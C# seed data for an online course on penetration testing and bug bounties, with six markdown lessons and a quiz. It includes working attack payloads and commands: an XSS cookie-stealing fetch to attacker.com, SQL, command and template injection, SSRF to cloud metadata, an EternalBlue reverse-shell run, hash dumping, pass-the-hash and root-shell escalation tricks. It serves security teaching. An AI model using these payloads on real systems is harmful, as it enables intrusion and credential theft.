using System.Collections.Generic;
using BhavaniTech.Core.Models;

namespace BhavaniTech.Core.Database
{
    public static partial class CurriculumSeeder
    {
        internal static IEnumerable<CourseSeed> GetGreyHatCourses() => new[]
        {
            new CourseSeed(
                "GH101",
                "Grey Hat Hacking: Professional Penetration Testing & Security Research",
                CourseCategory.Cybersecurity,
                "Master the full attack lifecycle - recon, scanning, exploitation, post-exploitation, and responsible disclosure - the way real bug-bounty hunters and red-team professionals do it.",
                "Shield",
                18)
        };

        internal static IEnumerable<ModuleSeed> GetGreyHatModules() => new[]
        {
            new ModuleSeed("M_GH", "GH101", "Ethical Hacking, Bug Bounty & Red-Team Operations", 1)
        };

        internal static List<LessonSeed> GetGreyHatLessons() => new()
        {
            new LessonSeed(
                "GH_1", "M_GH",
                "Hacker Mindset, Law & Responsible Disclosure",
                "Understand what grey-hat hacking means legally and ethically, the CVD/bug-bounty ecosystem, and how to stay on the right side of computer-crime law.",
                "# Hacker Mindset, Law & Responsible Disclosure\n\n" +
                "## What Is a Grey Hat Hacker?\n\n" +
                "| Colour | Intent | Authorisation |\n" +
                "|--------|--------|---------------|\n" +
                "| White Hat | Defensive, hired | Always authorised |\n" +
                "| Grey Hat | Finds vulns without permission, discloses responsibly | No explicit auth, no malicious use |\n" +
                "| Black Hat | Malicious, profit-driven | Never authorised |\n\n" +
                "A grey hat hacker probes systems to **find and report** weaknesses - not to exploit them for personal gain.\n" +
                "The goal of this course: become a **professional white-hat / grey-hat researcher** who earns recognition, CVEs, and bug-bounty payouts legally.\n\n" +
                "---\n\n" +
                "## Legal Landscape\n\n" +
                "### Key Laws (know these!)\n" +
                "- **CFAA (USA)** - Computer Fraud and Abuse Act: unauthorised access = federal crime.\n" +
                "- **CMA (UK)** - Computer Misuse Act: similar scope.\n" +
                "- **IT Act 2000 (India)** - Section 66: punishes unauthorised computer access.\n\n" +
                "### Safe Harbours\n" +
                "1. **Bug-bounty programmes** (HackerOne, Bugcrowd, Intigriti) - explicit permission to hack in-scope systems.\n" +
                "2. **CVD - Coordinated Vulnerability Disclosure** - contact vendor privately, give 90-day fix window, then publish.\n" +
                "3. **CTF (Capture The Flag)** competitions - fully legalised hacking sandboxes.\n\n" +
                "---\n\n" +
                "## The PTES - Penetration Testing Execution Standard\n\n" +
                "```\n" +
                "Pre-Engagement -> Intelligence Gathering -> Threat Modelling\n" +
                "-> Vulnerability Analysis -> Exploitation -> Post-Exploitation\n" +
                "-> Reporting & Responsible Disclosure\n" +
                "```\n\n" +
                "Every professional pentest follows this lifecycle.\n\n" +
                "---\n\n" +
                "## Setting Up a Safe Lab\n\n" +
                "```bash\n" +
                "# Recommended stack (all free/open-source)\n" +
                "VirtualBox or VMware Workstation Player\n" +
                "  Kali Linux 2024.x   (attacker machine)\n" +
                "  Metasploitable 3    (intentionally vulnerable target)\n" +
                "  DVWA (Docker)       (vulnerable web app)\n" +
                "  VulnHub VMs         (offline CTF-style machines)\n" +
                "```\n\n" +
                "> **Rule #1** - Never practice on systems you do not own or lack written permission to test.\n\n" +
                "---\n\n" +
                "## Responsible Disclosure - Step by Step\n\n" +
                "1. **Discover** the vulnerability (document everything with timestamps).\n" +
                "2. **Verify** it is a real issue, not a misconfiguration on your end.\n" +
                "3. **Write a clear PoC** (Proof of Concept) - minimal, non-destructive.\n" +
                "4. **Contact the security team** - security@company.com or their HackerOne page.\n" +
                "5. **Agree on a timeline** - standard is 90 days (Google Project Zero policy).\n" +
                "6. **Publish after fix** - write a blog post, submit for CVE.\n\n" +
                "---\n\n" +
                "## Bug Bounty Economics\n\n" +
                "| Platform | Top Payout (web critical) | Top Payout (mobile/binary) |\n" +
                "|----------|--------------------------|----------------------------|\n" +
                "| HackerOne | $1,000 - $50,000 | Up to $1,000,000 (Apple) |\n" +
                "| Bugcrowd | $500 - $30,000 | Varies |\n" +
                "| Intigriti | EUR 500 - $25,000 | Varies |\n\n" +
                "Top researchers earn **$100K-$2M/year** from bug bounties alone.\n\n" +
                "---\n\n" +
                "## Key Takeaways\n" +
                "- Grey hat != criminal - it is a spectrum of ethical security research.\n" +
                "- Always have explicit authorisation before touching production systems.\n" +
                "- CVD and bug-bounty platforms are your legal safe harbour.\n" +
                "- Document everything - timestamps, payloads, responses.",
                45, "Intermediate"),

            new LessonSeed(
                "GH_2", "M_GH",
                "Reconnaissance & OSINT Mastery",
                "Passive and active recon techniques: WHOIS, DNS enumeration, Google dorks, Shodan, theHarvester, and Maltego - the foundation of every successful pentest.",
                "# Reconnaissance & OSINT Mastery\n\n" +
                "## The Recon Phase\n\n" +
                "> 'Give me six hours to chop down a tree and I will spend the first four sharpening the axe.'\n\n" +
                "Recon = **intelligence gathering before touching the target**.\n" +
                "The more you know, the more precise and stealthy your attack.\n\n" +
                "---\n\n" +
                "## Passive Recon (Zero Network Touch)\n\n" +
                "### 1. WHOIS Lookup\n" +
                "```bash\n" +
                "whois example.com\n" +
                "# Registrar, name servers, admin email, registration dates\n" +
                "```\n\n" +
                "### 2. DNS Enumeration\n" +
                "```bash\n" +
                "nslookup example.com\n" +
                "dig example.com ANY\n\n" +
                "# Subdomain brute-force\n" +
                "dnsx -d example.com -w /usr/share/wordlists/subdomains-top1mil-5000.txt\n" +
                "amass enum -d example.com -passive\n" +
                "subfinder -d example.com -silent\n" +
                "```\n\n" +
                "### 3. Google Dorks (OSINT via search engine)\n" +
                "```\n" +
                "site:example.com filetype:pdf           # Find indexed PDFs\n" +
                "site:example.com inurl:admin            # Admin panels\n" +
                "site:example.com intitle:'index of'     # Directory listings\n" +
                "'example.com' ext:sql OR ext:bak        # Exposed backups\n" +
                "inurl:'.git' site:example.com           # Leaked git repos\n" +
                "```\n\n" +
                "### 4. Shodan - 'Google for Hackers'\n" +
                "```bash\n" +
                "shodan search 'hostname:example.com'\n" +
                "shodan host 93.184.216.34\n\n" +
                "# Key filters\n" +
                "org:'Target Corp'     # All IPs registered to org\n" +
                "port:3389 country:IN  # RDP exposed in India\n" +
                "```\n\n" +
                "### 5. Certificate Transparency\n" +
                "```bash\n" +
                "curl 'https://crt.sh/?q=%.example.com&output=json' | jq '.[].name_value' | sort -u\n" +
                "# Lists all SSL certs ever issued - reveals hidden subdomains\n" +
                "```\n\n" +
                "---\n\n" +
                "## Active Recon (Light Touch - Careful!)\n\n" +
                "### theHarvester - Email, Subdomain, IP Aggregator\n" +
                "```bash\n" +
                "theHarvester -d example.com -b google,bing,linkedin,shodan\n" +
                "# Collects emails, subdomains, IPs from multiple sources\n" +
                "```\n\n" +
                "---\n\n" +
                "## Recon Automation Pipeline\n" +
                "```bash\n" +
                "TARGET='example.com'\n" +
                "subfinder -d $TARGET -silent | httpx -silent | nuclei -t technologies/\n" +
                "```\n\n" +
                "---\n\n" +
                "## OSINT Tools Reference\n\n" +
                "| Tool | Purpose |\n" +
                "|------|----------|\n" +
                "| amass | Subdomain enumeration |\n" +
                "| subfinder | Fast passive subdomain |\n" +
                "| theHarvester | Email/IP/subdomain |\n" +
                "| shodan | IoT/exposed service search |\n" +
                "| spiderfoot | Automated OSINT |\n\n" +
                "---\n\n" +
                "## Key Takeaways\n" +
                "- Passive recon leaves **zero traces** - always start here.\n" +
                "- Google dorks expose more than most people realise.\n" +
                "- Shodan finds real production systems exposed to the internet.\n" +
                "- Certificate transparency logs reveal **all subdomains** ever used.",
                55, "Intermediate"),

            new LessonSeed(
                "GH_3", "M_GH",
                "Network Scanning, Enumeration & Vulnerability Assessment",
                "Master Nmap scripting, service fingerprinting, Nikto, OpenVAS, and Metasploit's auxiliary scanners to map attack surfaces like a professional.",
                "# Network Scanning, Enumeration & Vulnerability Assessment\n\n" +
                "## The Scanning Phase\n\n" +
                "After recon, we **actively probe** the target to identify open ports, services, OS fingerprints, and misconfigurations.\n\n" +
                "---\n\n" +
                "## Nmap - The Hacker's Swiss Army Knife\n\n" +
                "```bash\n" +
                "# 1. Host discovery (ping sweep)\n" +
                "nmap -sn 192.168.1.0/24\n\n" +
                "# 2. Port discovery (SYN scan, top 1000)\n" +
                "nmap -sS -T4 192.168.1.10\n\n" +
                "# 3. All 65535 ports\n" +
                "nmap -p- -T4 192.168.1.10\n\n" +
                "# 4. Version + OS detection\n" +
                "nmap -sV -O 192.168.1.10\n\n" +
                "# 5. Aggressive scan\n" +
                "nmap -A 192.168.1.10\n\n" +
                "# 6. Vulnerability scripts\n" +
                "nmap --script vuln 192.168.1.10\n" +
                "```\n\n" +
                "### Nmap NSE Power Commands\n" +
                "```bash\n" +
                "# EternalBlue check\n" +
                "nmap --script smb-vuln-ms17-010 -p 445 192.168.1.10\n\n" +
                "# HTTP enumeration\n" +
                "nmap --script http-enum 192.168.1.10\n\n" +
                "# SSL audit\n" +
                "nmap --script ssl-enum-ciphers -p 443 192.168.1.10\n" +
                "```\n\n" +
                "---\n\n" +
                "## Service-Specific Enumeration\n\n" +
                "### SMB (Port 445)\n" +
                "```bash\n" +
                "# List shares anonymously\n" +
                "smbclient -L //192.168.1.10 -N\n\n" +
                "# CrackMapExec\n" +
                "cme smb 192.168.1.0/24\n" +
                "cme smb 192.168.1.10 -u '' -p '' --shares\n" +
                "```\n\n" +
                "### Web Application Surface\n" +
                "```bash\n" +
                "# Nikto\n" +
                "nikto -h http://192.168.1.10\n\n" +
                "# Directory brute-force\n" +
                "gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt\n" +
                "```\n\n" +
                "---\n\n" +
                "## Attack Surface Matrix\n\n" +
                "```\n" +
                "Port 22  SSH   -> Brute force, key auth bypass\n" +
                "Port 80  HTTP  -> Web app attacks (OWASP Top 10)\n" +
                "Port 445 SMB   -> EternalBlue, relay attacks\n" +
                "Port 3306 MySQL -> Default creds, SQL injection\n" +
                "Port 3389 RDP  -> BlueKeep, brute force\n" +
                "```\n\n" +
                "---\n\n" +
                "## Key Takeaways\n" +
                "- Always scan with increasing aggressiveness: passive then active.\n" +
                "- Nmap NSE scripts automate vulnerability checks for known CVEs.\n" +
                "- SMB enumeration reveals users, shares, and domain info.\n" +
                "- Document every finding - scan output -> report.",
                60, "Advanced"),

            new LessonSeed(
                "GH_4", "M_GH",
                "Web Application Hacking - OWASP Top 10 in Depth",
                "Exploit SQL Injection, XSS, IDOR, SSRF, SSTI, broken authentication, and command injection hands-on using Burp Suite, sqlmap, and DVWA.",
                "# Web Application Hacking - OWASP Top 10 in Depth\n\n" +
                "## Why Web?\n" +
                "Web applications are the **#1 bug-bounty attack surface**.\n\n" +
                "---\n\n" +
                "## A01 - SQL Injection (SQLi)\n\n" +
                "### Manual Testing\n" +
                "```sql\n" +
                "-- Payloads to try in input fields:\n" +
                "'                          -- Error = vulnerable\n" +
                "' OR '1'='1               -- Classic bypass\n" +
                "' OR 1=1 --               -- MySQL comment bypass\n" +
                "' UNION SELECT 1,2,3 --   -- Column count probe\n" +
                "' UNION SELECT table_name,2,3 FROM information_schema.tables --\n" +
                "```\n\n" +
                "### sqlmap - Automated SQLi\n" +
                "```bash\n" +
                "# Basic detection\n" +
                "sqlmap -u 'http://target.com/page?id=1' --dbs\n\n" +
                "# Dump database\n" +
                "sqlmap -u 'http://target.com/page?id=1' -D mydb --tables\n" +
                "sqlmap -u 'http://target.com/page?id=1' -D mydb -T users --dump\n" +
                "```\n\n" +
                "---\n\n" +
                "## A03 - XSS (Cross-Site Scripting)\n\n" +
                "```javascript\n" +
                "// Reflected XSS payloads\n" +
                "<script>alert(1)</script>\n" +
                "<img src=x onerror=alert(1)>\n\n" +
                "// Cookie stealing\n" +
                "<script>fetch('https://attacker.com/log?c='+document.cookie)</script>\n" +
                "```\n\n" +
                "---\n\n" +
                "## A04 - IDOR (Insecure Direct Object Reference)\n\n" +
                "```\n" +
                "# Change user ID in URL:\n" +
                "GET /api/users/1234/profile  ->  GET /api/users/1235/profile\n" +
                "GET /download?file=report_user123.pdf  ->  file=report_user124.pdf\n" +
                "```\n\n" +
                "---\n\n" +
                "## A05 - Security Misconfiguration\n\n" +
                "```bash\n" +
                "# Default credentials to always try:\n" +
                "admin:admin  admin:password  admin:1234  root:root\n\n" +
                "# Exposed debug endpoints:\n" +
                "/actuator/env     # Spring Boot - leaks all env vars!\n" +
                "/.git/            # Exposed Git - source code leak\n" +
                "/server-status    # Apache mod_status\n" +
                "```\n\n" +
                "---\n\n" +
                "## A06 - SSRF (Server-Side Request Forgery)\n\n" +
                "```bash\n" +
                "# When app fetches a URL you control:\n" +
                "?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n" +
                "?url=http://localhost:6379/   # Internal Redis\n" +
                "?url=file:///etc/passwd       # Local file read\n" +
                "```\n\n" +
                "---\n\n" +
                "## A07 - Command Injection\n\n" +
                "```bash\n" +
                "# When app runs system command with your input:\n" +
                "8.8.8.8; cat /etc/passwd\n" +
                "8.8.8.8 && whoami\n" +
                "8.8.8.8 | ls -la /\n" +
                "$(id)\n" +
                "```\n\n" +
                "---\n\n" +
                "## SSTI - Server-Side Template Injection (Jinja2)\n\n" +
                "```python\n" +
                "# Detection\n" +
                "{{7*7}}   # Output: 49 = vulnerable!\n\n" +
                "# RCE via Python class introspection\n" +
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\n" +
                "```\n\n" +
                "---\n\n" +
                "## Key Takeaways\n" +
                "- Web apps are the richest bug-bounty surface - learn Burp Suite deeply.\n" +
                "- SQLi + IDOR are still the most common critical bugs paid in bounty.\n" +
                "- SSRF -> cloud metadata = instant credential theft.\n" +
                "- Command injection = immediate shell access.",
                75, "Advanced"),

            new LessonSeed(
                "GH_5", "M_GH",
                "Exploitation, Privilege Escalation & Post-Exploitation",
                "Use Metasploit to exploit vulnerabilities, escalate privileges on Linux and Windows, establish persistence, and move laterally through networks like a red-team operator.",
                "# Exploitation, Privilege Escalation & Post-Exploitation\n\n" +
                "## Metasploit Framework (MSF)\n\n" +
                "```bash\n" +
                "msfconsole\n\n" +
                "# Search for exploits\n" +
                "search eternalblue\n" +
                "use exploit/windows/smb/ms17_010_eternalblue\n" +
                "set RHOSTS 192.168.1.10\n" +
                "set LHOST 192.168.1.5\n" +
                "set PAYLOAD windows/x64/meterpreter/reverse_tcp\n" +
                "run\n" +
                "```\n\n" +
                "---\n\n" +
                "## Meterpreter - Post-Exploitation Shell\n\n" +
                "```bash\n" +
                "meterpreter > sysinfo          # OS, hostname, arch\n" +
                "meterpreter > getuid           # Current user\n" +
                "meterpreter > hashdump         # Dump NTLM password hashes\n" +
                "meterpreter > run post/multi/recon/local_exploit_suggester\n" +
                "meterpreter > getsystem        # Auto privilege escalation\n" +
                "meterpreter > shell            # Drop to CMD shell\n" +
                "```\n\n" +
                "---\n\n" +
                "## Linux Privilege Escalation\n\n" +
                "```bash\n" +
                "# SUID binaries (run as file owner, potentially root)\n" +
                "find / -perm -4000 -type f 2>/dev/null\n" +
                "# Check https://gtfobins.github.io for exploitation\n\n" +
                "# What can I run as root?\n" +
                "sudo -l\n\n" +
                "# Cron scripts writable by current user?\n" +
                "cat /etc/crontab\n" +
                "find / -writable -type f 2>/dev/null | grep -v proc\n" +
                "```\n\n" +
                "### LinPEAS - Automated Linux Priv Esc\n" +
                "```bash\n" +
                "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n" +
                "# Colour-coded output: Red = critical, Yellow = notable\n" +
                "```\n\n" +
                "### Common Linux Priv Esc Vectors\n" +
                "```bash\n" +
                "# 1. Sudo misconfiguration\n" +
                "sudo /usr/bin/vim /etc/hosts\n" +
                "# In vim: :!/bin/bash  -> root shell!\n\n" +
                "# 2. SUID on find\n" +
                "find . -exec /bin/bash -p \\;\n\n" +
                "# 3. Docker group membership\n" +
                "docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n" +
                "```\n\n" +
                "---\n\n" +
                "## Windows Privilege Escalation\n\n" +
                "```powershell\n" +
                "# WinPEAS\n" +
                ".\\winPEAS.exe\n\n" +
                "# AlwaysInstallElevated check\n" +
                "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n" +
                "msiexec /quiet /qn /i evil.msi\n" +
                "```\n\n" +
                "---\n\n" +
                "## Lateral Movement\n\n" +
                "```bash\n" +
                "# Pass-the-Hash with CrackMapExec\n" +
                "cme smb 192.168.1.0/24 -u administrator -H NTLM_HASH\n\n" +
                "# impacket psexec\n" +
                "python3 psexec.py administrator@192.168.1.10 -hashes :NTLM_HASH\n" +
                "```\n\n" +
                "---\n\n" +
                "## Key Takeaways\n" +
                "- Metasploit automates exploitation; Meterpreter powers post-exploitation.\n" +
                "- LinPEAS / WinPEAS find 90% of priv-esc paths automatically.\n" +
                "- Lateral movement = using one compromised host to attack others.\n" +
                "- Always document your attack path for the pentest report.",
                80, "Expert"),

            new LessonSeed(
                "GH_6", "M_GH",
                "Bug Bounty Hunting, CVE Research & Professional Pentest Reporting",
                "Master the full bug-bounty workflow: scoping, hunting methodology, PoC writing, CVSS scoring, writing professional CVE reports, and building a researcher profile.",
                "# Bug Bounty Hunting, CVE Research & Professional Pentest Reporting\n\n" +
                "## The Bug Bounty Ecosystem\n\n" +
                "```\n" +
                "You (Researcher) -> Find Bug -> Report to Platform -> Vendor Validates\n" +
                "-> Vendor Fixes -> You Get Paid -> Optional: CVE Assigned -> Blog Post\n" +
                "```\n\n" +
                "---\n\n" +
                "## Top Platforms & How to Start\n\n" +
                "- **HackerOne**: hackerone.com - start with VDPs (no bounty, no legal risk)\n" +
                "- **Bugcrowd**: bugcrowd.com/university - free training\n" +
                "- **Intigriti**, YesWeHack, Synack (invite-only)\n\n" +
                "---\n\n" +
                "## Scoping - What You Can Test\n\n" +
                "```\n" +
                "In scope:\n" +
                "   *.example.com           # All subdomains\n" +
                "   api.example.com         # API endpoints\n\n" +
                "Out of scope:\n" +
                "   partner.example.com     # Third-party hosted\n" +
                "   DoS/DDoS attacks        # Almost always excluded\n" +
                "```\n\n" +
                "---\n\n" +
                "## Bug Hunter Methodology\n\n" +
                "```bash\n" +
                "# Phase 1: RECON\n" +
                "# Subdomain enumeration\n" +
                "subfinder -d example.com | httpx -silent\n\n" +
                "# JS file mining - find hidden API keys, endpoints\n" +
                "gau example.com | grep '.js$' | sort -u > jsfiles.txt\n" +
                "cat jsfiles.txt | xargs -I{} curl -s {} | grep -E 'api_key|secret|token|password'\n\n" +
                "# Historical URLs\n" +
                "waybackurls example.com\n" +
                "```\n\n" +
                "---\n\n" +
                "## CVSS Scoring - Understanding Bug Severity\n\n" +
                "```\n" +
                "CVSS v3.1 Score -> Severity\n" +
                "9.0 - 10.0 = Critical\n" +
                "7.0 - 8.9  = High\n" +
                "4.0 - 6.9  = Medium\n" +
                "0.1 - 3.9  = Low\n\n" +
                "Key Metrics: AV (Attack Vector), AC (Complexity), PR (Privs), UI (Interaction)\n" +
                "```\n\n" +
                "---\n\n" +
                "## Writing a Professional Bug Report\n\n" +
                "```markdown\n" +
                "# [CRITICAL] SQL Injection in /api/v1/users?id= Parameter\n\n" +
                "Severity: CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)\n\n" +
                "## Summary\n" +
                "The id parameter is vulnerable to error-based SQLi.\n\n" +
                "## Steps to Reproduce\n" +
                "1. Navigate to: https://api.example.com/v1/users?id=1\n" +
                "2. Append payload: ?id=1' AND SLEEP(5)--\n" +
                "3. Observe 5-second delay confirming blind SQLi.\n\n" +
                "## Remediation\n" +
                "Use parameterised queries / prepared statements.\n" +
                "```\n\n" +
                "---\n\n" +
                "## Building Your Researcher Profile\n\n" +
                "| Activity | Benefit |\n" +
                "|---------|----------|\n" +
                "| CTF competitions (HackTheBox, TryHackMe) | Skill building + reputation |\n" +
                "| Write-ups / blog posts | Visibility + community respect |\n" +
                "| CVE credits | Professional credential |\n\n" +
                "### Recommended Certifications\n" +
                "```\n" +
                "eJPT  (eLearnSecurity) -> Perfect first cert, affordable\n" +
                "OSCP  (OffSec)         -> Gold standard for pentesters\n" +
                "CEH   (EC-Council)     -> Well-known in enterprise hiring\n" +
                "BSCP  (PortSwigger)    -> Web-app specialist cert\n" +
                "```\n\n" +
                "---\n\n" +
                "## Key Takeaways\n" +
                "- Bug bounty is a legitimate career: top researchers earn $1M+/year.\n" +
                "- Always stay in scope - out-of-scope testing = legal risk.\n" +
                "- A perfect report (clear PoC + impact + CVSS + remediation) gets paid faster.\n" +
                "- Build your brand: blog, CTF write-ups, and CVEs open doors to red-team jobs.",
                70, "Expert")
        };

        internal static List<QuizSeed> GetGreyHatQuizzes() => new()
        {
            new QuizSeed("GH_1",
                "A researcher finds a critical RCE vulnerability on a public website without authorisation, then emails the company to privately disclose it and waits 90 days before publishing. This describes which practice?",
                "Black Hat Hacking", "Grey Hat / Coordinated Vulnerability Disclosure", "White Hat Bug Bounty", "Doxxing",
                "B",
                "Grey hat hackers often discover vulnerabilities without explicit authorisation but act in good faith by disclosing responsibly (CVD) rather than exploiting for profit. The 90-day timeline is the industry standard established by Google Project Zero."),

            new QuizSeed("GH_2",
                "Which tool queries Certificate Transparency logs to reveal all SSL certificates ever issued for a domain, exposing hidden subdomains?",
                "Shodan", "Maltego", "crt.sh", "theHarvester",
                "C",
                "crt.sh queries public Certificate Transparency logs maintained by CAs. Every SSL certificate issued must be logged there, meaning even hidden/internal subdomains appear if they ever had an HTTPS certificate issued."),

            new QuizSeed("GH_3",
                "What does the Nmap command 'nmap --script smb-vuln-ms17-010 -p 445 192.168.1.10' check for?",
                "Anonymous FTP login", "EternalBlue vulnerability (MS17-010) via SMB", "Default web application credentials", "SSL/TLS weak cipher suites",
                "B",
                "MS17-010 (EternalBlue) is the SMB vulnerability exploited by WannaCry ransomware. The Nmap NSE script probes port 445 to determine if the target is unpatched and vulnerable to this critical remote code execution flaw."),

            new QuizSeed("GH_4",
                "An attacker injects {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} into a form field and gets command output back. What vulnerability is this?",
                "SQL Injection", "Cross-Site Scripting (XSS)", "Server-Side Template Injection (SSTI) in Jinja2", "Path Traversal",
                "C",
                "This is Server-Side Template Injection (SSTI) targeting Jinja2 (Python/Flask). By escaping the template sandbox using Python's class hierarchy, attackers achieve Remote Code Execution. The double curly braces are Jinja2's expression delimiters."),

            new QuizSeed("GH_5",
                "A Linux user runs 'find / -perm -4000 -type f 2>/dev/null'. What are they looking for?",
                "World-writable configuration files", "SUID (Set User ID) binaries that execute with owner's privileges", "Files modified in the last 24 hours", "Hidden directories containing credentials",
                "B",
                "The -perm -4000 flag finds files with the SUID bit set. SUID binaries execute with the permissions of the file owner (often root), not the user running them. Attackers check GTFOBins to find which SUID binaries can be abused to spawn a root shell."),

            new QuizSeed("GH_6",
                "In a bug bounty report, what does a CVSS 9.8 score with metrics AV:N/AC:L/PR:N/UI:N indicate about the vulnerability?",
                "Requires physical access, complex exploitation, and admin privileges", "Exploitable remotely over the network with no auth, no user interaction, low complexity", "Only affects confidentiality, not integrity or availability", "Requires social engineering to trigger",
                "B",
                "CVSS AV:N = Network-accessible (remote), AC:L = Low complexity (easy to exploit), PR:N = No Privileges Required (unauthenticated), UI:N = No User Interaction needed. Combined, this describes a catastrophic, remotely exploitable vulnerability - typical of critical SQLi, RCE, or authentication bypass bugs.")
        };
    }
}
